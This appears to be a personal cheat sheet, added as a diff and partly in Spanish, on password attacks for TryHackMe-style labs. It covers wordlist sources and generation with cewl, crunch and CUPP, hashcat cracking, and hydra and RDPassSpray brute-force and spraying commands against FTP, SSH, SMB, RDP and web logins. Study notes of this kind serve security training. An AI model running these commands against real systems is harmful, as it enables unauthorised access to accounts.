@@ -1,0 +1,147 @@
+Password attacks
+
+Default Passwords
+
+https://cirt.net/passwords
+https://default-password.info/
+https://datarecovery.com/rd/default-passwords/
+
+Weak Passwords
+https://github.com/danielmiessler/SecLists/tree/master/Passwords
+https://wiki.skullsecurity.org/index.php?title=Passwords
+
+Leaked Passwords
+https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases
+
+--------------------------------------------------------------------------------------------------
+
+Combined wordlists
+
+cat file1.txt file2.txt file3.txt > combined_list.txt 
+
+Clean, remove duplicated
+
+sort combined_list.txt | uniq -u > cleaned_combined_list.txt
+
+--------------------------------------------------------------------------------------------------
+
+Customized Wordlists
+
+cewl -w list.txt -d 5 -m http://site.com
+
+-w  escribirá el contenido en un archivo.
+-m 5  reúne cadenas (palabras) que tienen 5 caracteres o más
+-d 5  es el nivel de profundidad del rastreo/spiding web
+
+Como resultado, ahora deberíamos tener una lista de palabras de tamaño decente basada en palabras relevantes para la empresa específica, como nombres, ubicaciones y gran parte de su jerga comercial.
+
+--------------------------------------------------------------------------------------------------
+
+Username Wordlists
+
+Download... git clone https://github.com/therodri2/username_generator.git
+Create file with names. example: echo "Jhon Smith" > users.txt
+
+python3 username_generator.py -w users.txt
+
+--------------------------------------------------------------------------------------------------
+Keyspace Technique
+
+we specify a range of characters, numbers, and symbols in our wordlist.
+
+crunch 2 2 01234abcd -o crunch.txt
+Create list with 2 min and 2 max in range "01234abcd" and output file "crunch.txt"
+
+crunch 8 8 0123456789abcdefABCDEF -o crunch.txt
+
+crunch 5 5 -t "THM^^" -o tryhackme.txt
+
+Option -t 
+@ - lower case alpha characters
+
+, - upper case alpha characters
+
+% - numeric characters
+
+^ - special characters including space
+
+--------------------------------------------------------------------------------------------------
+
+CUPP - Common User Passwords Profiler
+
+CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information
+
+git clone https://github.com/Mebus/cupp.git
+
+python3 cupp.py -i (interactive is the major)
+
+--------------------------------------------------------------------------------------------------
+
+Dictionary attack
+
+Tools Identifiers
+
+> hash-identifier
+> https://hashes.com/es/tools/hash_identifier
+
+hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
+
+hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d <---- Numbers
+
+--------------------------------------------------------------------------------------------------
+
+Offline attacks - Rules-Based
+Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords.
+
+See rules for john
+> cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
+https://charlesreid1.com/wiki/John_the_Ripper/Rules
+https://charlesreid1.com/wiki/John_the_Ripper/Password_Generation
+--------------------------------------------------------------------------------------------------
+
+Online password attacks
+
+FTP
+hydra -l ftp -P passlist.txt ftp://10.10.x.x
+
+-l = username -L list-username
+-p = password -P List-password
+
+SMTP
+hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
+
+SSH
+hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
+
+HTTP logins pages
+hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+
+hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
+
+SMB
+hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
+
+MS-SQL
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.128 mssql
+
+
+
+--------------------------------------------------------------------------------------------------
+
+Password spray attacks
+
+Un ataque de fuerza bruta se dirige a un nombre de usuario específico para probar muchas contraseñas débiles y predecibles. Mientras que un ataque de rociado de contraseñas se dirige a muchos nombres de usuario que usan una contraseña débil común, lo que podría ayudar a evitar una política de bloqueo de cuenta.
+
+SSH
+hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
+
+RDP
+https://github.com/xFreed0m/RDPassSpray
+
+python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
+
+RDP - Active Directory
+python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
+
+https://github.com/byt3bl33d3r/SprayingToolkit
+A set of Python scripts/utilities that tries to make password spraying attacks against Lync/S4B & OWA 
